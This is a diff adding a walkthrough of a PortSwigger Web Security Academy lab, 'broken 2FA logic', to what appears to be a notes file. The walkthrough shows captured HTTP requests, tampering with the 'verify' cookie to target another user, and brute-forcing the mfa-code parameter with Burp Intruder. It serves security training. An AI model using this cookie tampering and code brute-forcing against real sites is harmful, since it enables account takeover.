@@ -691,7 +691,95 @@ acceso : letmein
 
 
 
+<details>
+  <summary>Lab: 2FA broken logic</summary>
 
+<img width="1102" height="173" alt="image" src="https://github.com/user-attachments/assets/d701902a-1edd-4370-9cb7-e6df9b3dee61" />
+
+---
+
+1. login to your account **`wiener : peter`**
+2. <img width="1296" height="613" alt="image" src="https://github.com/user-attachments/assets/df3add31-4a20-4768-a8b0-29c926dd4e32" />
+
+```http
+GET /login2 HTTP/2
+Host: 0af700e5033811f784723b2500240055.web-security-academy.net
+Cookie: session=IVwexIpV4Hmucl1mgiflN0hO6Any4WkY; verify=wiener
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0af700e5033811f784723b2500240055.web-security-academy.net/login
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+```
+
+> ### change **`wiener`** to `carlos` and send the request
+
+```http
+Cookie: session=IVwexIpV4Hmucl1mgiflN0hO6Any4WkY; verify=carlos
+```
+
+<img width="1539" height="753" alt="image" src="https://github.com/user-attachments/assets/cacb8b0c-b2b9-448e-829a-35fd0fb62a3f" />
+
+
+
+> ### now the website send the **`2fa`** to carlos
+
+> #### logout form your account and login to it again but don't write your **`2FA`** code and send the request to intruder
+
+<img width="782" height="279" alt="image" src="https://github.com/user-attachments/assets/2b05d78d-45c0-4d15-b16c-e186a99a8e89" />
+
+```http
+POST /login2 HTTP/2
+Host: 0af700e5033811f784723b2500240055.web-security-academy.net
+Cookie: session=U0GvMCS0BxfbwbJ8iMImN16k1qfpKw5w; verify=wiener
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+Origin: https://0af700e5033811f784723b2500240055.web-security-academy.net
+Referer: https://0af700e5033811f784723b2500240055.web-security-academy.net/login2
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+
+mfa-code=123456
+```
+
+> ### change **`wiener`** to `carlos`
+>
+> add **`123456`** as payload and set `payload type` brute forcer 
+
+<img width="1876" height="758" alt="image" src="https://github.com/user-attachments/assets/79203d2a-2f9d-41b1-8885-39823c515aa0" />
+
+> ### see **``302``**
+
+<img width="1703" height="815" alt="image" src="https://github.com/user-attachments/assets/a0105171-2c54-48e6-bce6-e145c8bd40b1" />
+
+> click **`view response in browser`**  
+
+<img width="1178" height="552" alt="image" src="https://github.com/user-attachments/assets/b3e1371f-3053-42ca-a6ce-f7cc89da9ccb" />
+
+<img width="1417" height="822" alt="image" src="https://github.com/user-attachments/assets/884e0d3c-2b5f-4a11-9a57-718c7f7892ba" />
+
+<img width="1565" height="749" alt="image" src="https://github.com/user-attachments/assets/7294253e-6ed6-4bc1-9061-224ac2d471b4" />
+
+  
+</details>
 
 
 
